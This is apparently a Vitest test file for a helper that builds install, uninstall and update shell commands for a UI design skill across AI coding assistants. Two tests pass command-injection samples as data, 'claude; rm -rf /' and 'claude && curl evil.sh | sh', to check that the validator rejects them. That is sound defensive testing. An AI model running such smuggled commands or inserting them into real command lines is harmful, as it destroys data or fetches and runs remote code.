import { describe, expect, it } from 'vitest';
import {
  buildUiProCommandPlan,
  buildUiProDesignSystemCommand,
  buildUiProUninstallCommands,
  buildUiProUpdateCommand,
  buildUiProUpdatePlan,
  isUiProAiTarget,
  UI_UX_PRO_MAX_AI_TARGETS,
  UI_UX_PRO_MAX_ALL_AGENTS,
  UI_UX_PRO_MAX_EXAMPLE_PROMPTS,
  UI_UX_PRO_MAX_GITHUB_URL,
  UI_UX_PRO_MAX_HIGHLIGHTS,
  UI_UX_PRO_MAX_NPM_PACKAGE,
  UI_UX_PRO_MAX_PLUGIN_COMMANDS,
  UI_UX_PRO_MAX_REPO,
  UI_UX_PRO_MAX_RULE_CATEGORIES,
  UI_UX_PRO_MAX_SKILL_ID,
  UI_UX_PRO_MAX_SKILL_NAME,
  UI_UX_PRO_MAX_STACK_GROUPS,
} from './uiUxProMax.js';

/**
 * Everything this builds ends up in a terminal the user is asked to confirm, so an
 * `--ai` value that never came from the target list must not reach a command line.
 * That filter is the reason `isUiProAiTarget` exists, and the reason every builder
 * runs its input through it.
 */

describe('identifiers', () => {
  it('derive the skill id and the GitHub URL from the repo, so they cannot drift', () => {
    expect(UI_UX_PRO_MAX_SKILL_ID).toBe(`${UI_UX_PRO_MAX_REPO}/${UI_UX_PRO_MAX_SKILL_NAME}`);
    expect(UI_UX_PRO_MAX_GITHUB_URL).toBe(`https://github.com/${UI_UX_PRO_MAX_REPO}`);
  });

  it('name both plugin commands after the same repo and skill', () => {
    expect(UI_UX_PRO_MAX_PLUGIN_COMMANDS).toHaveLength(2);
    expect(UI_UX_PRO_MAX_PLUGIN_COMMANDS[0]).toContain(UI_UX_PRO_MAX_REPO);
    expect(UI_UX_PRO_MAX_PLUGIN_COMMANDS[1]).toContain(UI_UX_PRO_MAX_SKILL_NAME);
  });
});

describe('UI_UX_PRO_MAX_AI_TARGETS', () => {
  it('has unique values and labels', () => {
    const values = UI_UX_PRO_MAX_AI_TARGETS.map((target) => target.value);
    const labels = UI_UX_PRO_MAX_AI_TARGETS.map((target) => target.label);
    expect(new Set(values).size).toBe(values.length);
    expect(new Set(labels).size).toBe(labels.length);
  });

  it('uses values that are safe as a bare shell argument', () => {
    for (const target of UI_UX_PRO_MAX_AI_TARGETS) {
      expect(target.value, target.label).toMatch(/^[a-z0-9-]+$/);
    }
  });

  it('never claims the "all" sentinel as one more assistant', () => {
    expect(UI_UX_PRO_MAX_AI_TARGETS.some((t) => t.value === UI_UX_PRO_MAX_ALL_AGENTS)).toBe(false);
  });

  it('gives every target a label and a known activation mode', () => {
    for (const target of UI_UX_PRO_MAX_AI_TARGETS) {
      expect(target.label.trim(), target.value).not.toBe('');
      expect(['skill', 'workflow', 'both'], target.value).toContain(target.mode);
    }
  });

  it('only documents a skill folder for a target that installs as a skill', () => {
    for (const target of UI_UX_PRO_MAX_AI_TARGETS) {
      if (!target.skillDir) continue;
      expect(target.mode, target.value).not.toBe('workflow');
      expect(target.skillDir, target.value).toMatch(/^\.[a-z]+\/skills$/);
    }
  });
});

describe('isUiProAiTarget', () => {
  it('accepts every listed target and the all sentinel', () => {
    for (const target of UI_UX_PRO_MAX_AI_TARGETS) {
      expect(isUiProAiTarget(target.value), target.value).toBe(true);
    }
    expect(isUiProAiTarget(UI_UX_PRO_MAX_ALL_AGENTS)).toBe(true);
  });

  it('rejects anything else, including an injection attempt', () => {
    expect(isUiProAiTarget('not-an-assistant')).toBe(false);
    expect(isUiProAiTarget('')).toBe(false);
    expect(isUiProAiTarget('claude; rm -rf /')).toBe(false);
  });
});

describe('buildUiProCommandPlan', () => {
  it('installs the CLI globally first, then runs one init per assistant', () => {
    expect(
      buildUiProCommandPlan({ method: 'npm-global', agents: ['claude', 'cursor'], global: false }),
    ).toEqual({
      setup: [`npm install -g ${UI_UX_PRO_MAX_NPM_PACKAGE}`],
      install: ['uipro init --ai claude', 'uipro init --ai cursor'],
    });
  });

  it('needs no setup step for npx, which fetches the package itself', () => {
    expect(buildUiProCommandPlan({ method: 'npx', agents: ['claude'], global: false })).toEqual({
      setup: [],
      install: [`npx ${UI_UX_PRO_MAX_NPM_PACKAGE} init --ai claude`],
    });
  });

  it('appends --global when the install targets the user home folder', () => {
    expect(
      buildUiProCommandPlan({ method: 'npm-global', agents: ['claude'], global: true }).install,
    ).toEqual(['uipro init --ai claude --global']);
  });

  it('has no shell commands at all for the Claude Code plugin route', () => {
    expect(
      buildUiProCommandPlan({ method: 'claude-plugin', agents: ['claude'], global: true }),
    ).toEqual({ setup: [], install: [] });
  });

  it('drops an assistant the CLI would not accept', () => {
    expect(
      buildUiProCommandPlan({
        method: 'npm-global',
        agents: ['claude', 'not-an-assistant', 'claude && curl evil.sh | sh'],
        global: false,
      }).install,
    ).toEqual(['uipro init --ai claude']);
  });

  it('collapses "every assistant" into the single all value', () => {
    expect(
      buildUiProCommandPlan({ method: 'npx', agents: [UI_UX_PRO_MAX_ALL_AGENTS], global: false })
        .install,
    ).toEqual([`npx ${UI_UX_PRO_MAX_NPM_PACKAGE} init --ai all`]);
  });

  it('produces no install commands when nothing valid was selected', () => {
    expect(
      buildUiProCommandPlan({ method: 'npm-global', agents: [], global: false }).install,
    ).toEqual([]);
  });
});

describe('buildUiProUninstallCommands', () => {
  it('removes the skill per assistant', () => {
    expect(
      buildUiProUninstallCommands({
        method: 'npm-global',
        agents: ['claude', 'cursor'],
        global: false,
      }),
    ).toEqual(['uipro uninstall --ai claude', 'uipro uninstall --ai cursor']);
  });

  it('falls back to a bare uninstall when no assistant is named', () => {
    expect(buildUiProUninstallCommands({ method: 'npm-global', agents: [], global: true })).toEqual(
      ['uipro uninstall --global'],
    );
  });

  it('uses the CLI directly even for a plugin install, since there is no plugin uninstall here', () => {
    expect(
      buildUiProUninstallCommands({ method: 'claude-plugin', agents: ['claude'], global: false }),
    ).toEqual(['uipro uninstall --ai claude']);
  });
});

describe('buildUiProUpdateCommand and buildUiProUpdatePlan', () => {
  it('refreshes the generated files, globally when asked', () => {
    expect(buildUiProUpdateCommand('npm-global', false)).toBe('uipro update');
    expect(buildUiProUpdateCommand('npm-global', true)).toBe('uipro update --global');
    expect(buildUiProUpdateCommand('npx', false)).toBe(`npx ${UI_UX_PRO_MAX_NPM_PACKAGE} update`);
  });

  it('pulls the newest CLI before regenerating, for a global install', () => {
    expect(buildUiProUpdatePlan({ method: 'npm-global', global: false })).toEqual({
      setup: [`npm install -g ${UI_UX_PRO_MAX_NPM_PACKAGE}@latest`],
      install: ['uipro update'],
    });
  });

  it('has no shell commands for the plugin route, which updates inside Claude Code', () => {
    expect(buildUiProUpdatePlan({ method: 'claude-plugin', global: false })).toEqual({
      setup: [],
      install: [],
    });
  });
});

describe('buildUiProDesignSystemCommand', () => {
  it('points the script path at the folder the skill was installed into', () => {
    expect(buildUiProDesignSystemCommand('.claude/skills', 'fintech dashboard')).toBe(
      `python3 .claude/skills/${UI_UX_PRO_MAX_SKILL_NAME}/scripts/search.py "fintech dashboard" --design-system`,
    );
  });

  it('adds the project name only when one is given', () => {
    expect(buildUiProDesignSystemCommand('.claude/skills', 'shop', 'My App')).toContain(
      '--design-system -p "My App"',
    );
    expect(buildUiProDesignSystemCommand('.claude/skills', 'shop', '')).not.toContain(' -p ');
    expect(buildUiProDesignSystemCommand('.claude/skills', 'shop')).not.toContain(' -p ');
  });
});

describe('README tables', () => {
  it('give every highlight a count, a label and a detail', () => {
    for (const highlight of UI_UX_PRO_MAX_HIGHLIGHTS) {
      expect(highlight.count, highlight.label).toMatch(/^\d+$/);
      expect(highlight.label.trim()).not.toBe('');
      expect(highlight.detail.trim()).not.toBe('');
    }
  });

  it('keep rule categories and stack groups unique and non-empty', () => {
    const categories = UI_UX_PRO_MAX_RULE_CATEGORIES.map((row) => row.category);
    expect(new Set(categories).size).toBe(categories.length);
    const groups = UI_UX_PRO_MAX_STACK_GROUPS.map((row) => row.group);
    expect(new Set(groups).size).toBe(groups.length);
    for (const row of UI_UX_PRO_MAX_RULE_CATEGORIES) expect(row.examples.trim()).not.toBe('');
    for (const row of UI_UX_PRO_MAX_STACK_GROUPS) expect(row.stacks.trim()).not.toBe('');
  });

  it('offer example prompts', () => {
    expect(UI_UX_PRO_MAX_EXAMPLE_PROMPTS.length).toBeGreaterThan(0);
    for (const prompt of UI_UX_PRO_MAX_EXAMPLE_PROMPTS) expect(prompt.trim()).not.toBe('');
  });
});
